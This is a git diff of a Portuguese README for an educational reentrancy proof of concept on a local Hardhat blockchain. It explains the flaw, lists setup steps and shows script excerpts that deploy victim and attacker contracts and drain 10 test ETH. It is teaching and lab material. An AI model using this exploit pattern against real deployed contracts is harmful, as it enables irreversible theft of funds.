@@ -1,6 +1,6 @@
 # Prova de Conceito (PoC): Ataque de Reentrancy em Smart Contract
 
-[cite_start]Este repositório contém o código-fonte e a explicação para uma Prova de Conceito (PoC) da vulnerabilidade de **Reentrancy** em Smart Contracts, com base na apresentação "Pentest em Blockchain: Reentrancy"[cite: 1].
+Este repositório contém o código-fonte e a explicação para uma Prova de Conceito (PoC) da vulnerabilidade de **Reentrancy** em Smart Contracts, com base na apresentação "Pentest em Blockchain: Reentrancy".
 
 ---
 
@@ -15,17 +15,17 @@ Não me responsabilizo pelo mau uso de qualquer informação aqui contida. O uso
 ## 1. Sobre a Vulnerabilidade: Reentrancy
 
 ### O que é?
-[cite_start]A Reentrancy (ou Reentrância) é uma das vulnerabilidades mais conhecidas e devastadoras em Smart Contracts[cite: 76].
+A Reentrancy (ou Reentrância) é uma das vulnerabilidades mais conhecidas e devastadoras em Smart Contracts.
 
-[cite_start]Ela ocorre quando um contrato externo (Atacante) consegue chamar repetidamente uma função em um contrato (Vítima) *antes* que a primeira invocação dessa função tenha seu estado atualizado[cite: 77].
+Ela ocorre quando um contrato externo (Atacante) consegue chamar repetidamente uma função em um contrato (Vítima) *antes* que a primeira invocação dessa função tenha seu estado atualizado.
 
 Em termos simples, o contrato do atacante "re-entra" na função de saque (`withdraw`) várias vezes antes que o contrato da vítima possa atualizar o saldo do atacante para zero.
 
 ### Por que é Crítico?
 A exploração bem-sucedida dessa falha geralmente permite que um atacante **drene completamente os fundos** (ETH ou outros tokens) de um contrato vulnerável.
 
-* [cite_start]Ataques em blockchain são **irreversíveis**[cite: 28].
-* [cite_start]Perdas financeiras podem chegar a centenas de milhões de dólares, como visto em ataques históricos[cite: 7, 8].
+* Ataques em blockchain são **irreversíveis**.
+* Perdas financeiras podem chegar a centenas de milhões de dólares, como visto em ataques históricos.
 
 ---
 
@@ -43,8 +43,8 @@ Para recriar o cenário de ataque, usamos o [Hardhat](https://hardhat.org/), um 
 
 1.  **Clone este repositório (ou crie um novo projeto):**
     ```bash
-    git clone [SEU_REPO_URL]
-    cd [NOME_DA_PASTA]
+    git clone https://github.com/Luan-Garcia/reentrancy-demo/
+    cd reentrancy-demo
     ```
 
 2.  **Inicie um projeto Hardhat e instale as dependências:**
@@ -57,7 +57,7 @@ Para recriar o cenário de ataque, usamos o [Hardhat](https://hardhat.org/), um 
 3.  **Adicione os contratos:** Coloque os arquivos `ReentrancyVictim.sol` e `ReentrancyAttack.sol` na pasta `/contracts` do seu projeto.
 
 4.  **Inicie um nó local do Hardhat:**
-    [cite_start]Este comando inicia uma blockchain local para testes, já com várias contas pré-carregadas com 10000 ETH de teste [cite: 98, 102-117].
+    Este comando inicia uma blockchain local para testes, já com várias contas pré-carregadas com 10000 ETH de teste.
     ```bash
     npx hardhat node
     ```
@@ -104,7 +104,7 @@ console.log("Depósito de 10 ETH realizado. Hash:", txDep.hash);
 // Verifica o saldo do contrato da Vítima
 const victimBalance = ethers.formatEther(await ethers.provider.getBalance(victimAddr));
 console.log("SALDO VÍTIMA (Antes do Ataque):", victimBalance, "ETH");
-[cite_start]// Resultado esperado: 10.0 ETH [cite: 198]
+// Resultado esperado: 10.0 ETH 
 ```
 
 ### Fase 2: Deploy do Contrato Atacante e Exploração
@@ -125,7 +125,7 @@ console.log("Contrato Atacante ('Attacker') publicado em:", attackerAddr);
 
 // Verifica saldos ANTES do ataque
 console.log("SALDO ATACANTE (Contrato) (Antes do Ataque):", ethers.formatEther(await ethers.provider.getBalance(attackerAddr)));
-[cite_start]// Resultado esperado: 0.0 ETH [cite: 236]
+// Resultado esperado: 0.0 ETH 
 
 console.log("\n>>> EXECUTANDO ATAQUE DE REENTRANCY...");
 
@@ -134,7 +134,7 @@ const attackTx = await attacker.connect(attackerEOA).attack({ value: ethers.pars
 const receipt = await attackTx.wait();
 
 console.log("Ataque concluído. Hash:", attackTx.hash);
-[cite_start]console.log("Status da Tx:", receipt.status, "| Gas Usado:", receipt.gasUsed.toString()); [cite: 241]
+console.log("Status da Tx:", receipt.status, "| Gas Usado:", receipt.gasUsed.toString()); 
 
 /* === RESULTADOS FINAIS === */
 console.log("\n--- RESULTADOS PÓS-ATAQUE ---");
@@ -144,13 +144,13 @@ const finalAttackerContractBalance = ethers.formatEther(await ethers.provider.ge
 const finalAttackerEOABalance = ethers.formatEther(await ethers.provider.getBalance(attackerEOA.address));
 
 console.log("SALDO VÍTIMA (Depois do Ataque):", finalVictimBalance, "ETH");
-[cite_start]// Resultado esperado: 0.0 ETH [cite: 244]
+// Resultado esperado: 0.0 ETH 
 
 console.log("SALDO ATACANTE (Contrato) (Depois do Ataque):", finalAttackerContractBalance, "ETH");
-[cite_start]// Resultado esperado: 11.0 ETH (10 ETH da Vítima + 1 ETH do Atacante) [cite: 245]
+// Resultado esperado: 11.0 ETH (10 ETH da Vítima + 1 ETH do Atacante) 
 
 console.log("SALDO ATACANTE (Carteira Pessoal):", finalAttackerEOABalance, "ETH");
-[cite_start]// Resultado esperado: (Um pouco menos de 9999 ETH, devido ao gas) [cite: 248]
+// Resultado esperado: (Um pouco menos de 9999 ETH, devido ao gas) 
 ```
 
 ## 4. Conclusão
